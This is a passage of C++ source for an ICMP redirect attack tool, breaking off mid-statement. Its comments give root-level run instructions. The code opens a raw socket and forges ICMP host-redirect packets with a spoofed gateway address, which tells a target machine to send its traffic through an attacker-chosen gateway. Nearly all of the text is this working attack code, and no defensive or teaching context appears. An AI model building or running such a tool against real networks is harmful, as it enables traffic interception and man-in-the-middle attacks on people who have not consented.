// Compile: g++ -o icmp_redirect icmp_redirect.cpp
// Run: sudo ./icmp_redirect <target_ip> <gateway_ip> <new_gateway_ip>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>
#include <unistd.h>

class ICMPRedirect {
private:
    int sock;
    
    unsigned short checksum(void* data, int len) {
        unsigned short* buf = (unsigned short*)data;
        unsigned int sum = 0;
        while (len > 1) { sum += *buf++; len -= 2; }
        if (len == 1) sum += *(unsigned char*)buf;
        sum = (sum >> 16) + (sum & 0xFFFF);
        sum += (sum >> 16);
        return ~sum;
    }
    
public:
    ICMPRedirect() {
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
        if (sock < 0) { perror("socket"); exit(1); }
    }
    
    void sendRedirect(const char* targetIP, const char* gatewayIP, 
                      const char* newGatewayIP) {
        struct sockaddr_in target;
        target.sin_family = AF_INET;
        target.sin_addr.s_addr = inet_addr(targetIP);
        
        char packet[4096];
        struct icmphdr* icmp = (struct icmphdr*)packet;
        
        memset(packet, 0, 4096);
        
        icmp->type = ICMP_REDIRECT;
        icmp->code = ICMP_REDIRECT_HOST;
        icmp->checksum = 0;
        icmp->un.gateway = inet_addr(newGatewayIP);
        
        // Original IP header (that caused redirect)
        struct iphdr* origIP = (struct iphdr*)(packet + sizeof(struct icmphdr));
        origIP->ihl = 5;
        origIP->version = 4;
        origIP->tot_len = sizeof(struct iphdr) + 8;
        origIP->ttl = 64;
        origIP->protocol = IPPROTO_TCP;
        origIP->saddr = inet_addr(gatewayIP);
        origIP->